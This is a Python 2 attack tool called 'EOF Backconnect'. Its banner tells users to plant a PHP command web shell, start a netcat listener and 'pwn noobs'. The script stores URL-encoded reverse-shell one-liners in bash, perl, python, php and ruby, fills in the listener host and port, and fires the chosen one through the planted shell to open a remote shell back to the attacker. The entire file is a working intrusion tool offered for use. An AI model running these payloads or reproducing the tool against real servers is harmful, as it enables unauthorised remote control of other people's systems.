#!/usr/bin/python
import argparse
import requests
from collections import OrderedDict


class BackConnect:
    def __init__(self):
        self.base_url = None
        self.lhost = None
        self.lport = None

    @staticmethod
    def print_header():
        print """
     ______ ____  ______ 
    |  ____/ __ \|  ____|
    | |__ | |  | | |__   
    |  __|| |  | |  __|  
    | |___| |__| | |     
    |______\____/|_|

    # EOF Backconnect #

    1) Create PHP command shell: <?php system($_GET['cmd']); ?>
    2) Set up a netcat listener: nc -nvlp {PORT} -s {HOST]
    3) Pwn noobs!     
            """

    def parse_params(self):
        parser = argparse.ArgumentParser(description="Use to create a terminal shell via a simple PHP shell.")
        parser.add_argument('-i', '--ip', help='The listener IP address.')
        parser.add_argument('-p', '--port', help='The listener port.')
        parser.add_argument('-u', '--url', help='The command shell URL (e.g. http://example/cmd.php?cmd=).')
        args = parser.parse_args()

        self.lhost = args.ip if args.ip is not None else raw_input("[+] Enter the listener IP: ")
        self.lport = args.port if args.port is not None else raw_input("[+] Enter the listener port: ")
        self.base_url = args.url if args.url is not None else raw_input("[+] Enter command shell URL (e.g. http://example/cmd.php?cmd=): ")

        self.backconnect(self.base_url, self.lhost, self.lport)

    def backconnect(self, base_url, lhost, lport):
        payloads = OrderedDict([
            ('bash', 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%7B%23LHOST%23%7D%2F%7B%23LPORT%23%7D%200%3E%261'),
            ('bash2','0%3C%26196%3Bexec%20196%3C%3E%2Fdev%2Ftcp%2F%7B%23LHOST%23%7D%2F%7B%23LPORT%23%7D%3B%20sh%20%3C%26196%20%3E%26196%202%3E%26196'),
            ('bash_udp', 'sh%20-i%20%3E%26%20%2Fdev%2Fudp%2F%7B%23LHOST%23%7D%2F%7B%23LPORT%23%7D%200%3E%261'),
            ('perl', 'perl%20-e%20%27use%20Socket%3B%24i%3D%22%7B%23LHOST%23%7D%22%3B%24p%3D%7B%23LPORT%23%7D%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27'),
            ('perl2', 'perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif(%24p)%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET(PeerAddr%2C%22%7B%23LHOST%23%7D%3A%7B%23LPORT%23%7D%22)%3BSTDIN-%3Efdopen(%24c%2Cr)%3B%24~-%3Efdopen(%24c%2Cw)%3Bsystem%24_%20while%3C%3E%3B%27'),
            ('python_1', 'export%20RHOST%3D%22%7B%23LHOST%23%7D%22%3Bexport%20RPORT%3D%7B%23LPORT%23%7D%3Bpython%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(%22RHOST%22)%2Cint(os.getenv(%22RPORT%22))))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27'),
            ('python_2', 'python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22%7B%23LHOST%23%7D%22%2C%7B%23LPORT%23%7D))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)%27'),
            ('python2_1', 'export%20RHOST%3D%22%7B%23LHOST%23%7D%22%3Bexport%20RPORT%3D%7B%23LPORT%23%7D%3Bpython2%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(%22RHOST%22)%2Cint(os.getenv(%22RPORT%22))))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27'),
            ('python2_2', 'python2%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22%7B%23LHOST%23%7D%22%2C%7B%23LPORT%23%7D))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)%27'),
            ('python3_1', 'export%20RHOST%3D%22%7B%23LHOST%23%7D%22%3Bexport%20RPORT%3D%7B%23LPORT%23%7D%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(%22RHOST%22)%2Cint(os.getenv(%22RPORT%22))))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27'),
            ('python3_2', 'python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22%7B%23LHOST%23%7D%22%2C%7B%23LPORT%23%7D))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)%27'),
            ('php', 'php%20-r%20%27%24sock%3Dfsockopen(%22%7B%23LHOST%23%7D%22%2C%7B%23LPORT%23%7D)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27'),
            ('ruby1', 'ruby%20-rsocket%20-e%27f%3DTCPSocket.open(%22%7B%23LHOST%23%7D%22%2C%7B%23LPORT%23%7D).to_i%3Bexec%20sprintf(%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf)%27%0A'),
            ('ruby2', 'ruby%20-rsocket%20-e%20%27exit%20if%20fork%3Bc%3DTCPSocket.new(%22%7B%23LHOST%23%7D%22%2C%22%7B%23LPORT%23%7D%22)%3Bwhile(cmd%3Dc.gets)%3BIO.popen(cmd%2C%22r%22)%7B%7Cio%7Cc.print%20io.read%7Dend%27')
        ])

        print "[#] Payloads:"
        for payload in payloads:
            print "\t[*] " + payload

        while True:
            command = raw_input("[+] Enter a payload to execute (or 'q' to exit): ")

            if command.lower() == 'q':
                exit()

            if command not in payloads:
                print "[!] That isn't a valid payload, please try again."
                continue

            formatted_payload = payloads[command]
            formatted_payload = formatted_payload.replace('%7B%23LHOST%23%7D', lhost)
            formatted_payload = formatted_payload.replace('%7B%23LPORT%23%7D', lport)
            payload_url = base_url + formatted_payload

            requests.get(payload_url)
            print "[#] Payload sent."

    def process(self):
        self.print_header()
        self.parse_params()


if __name__ == '__main__':
    backconnect = BackConnect()
    backconnect.process()


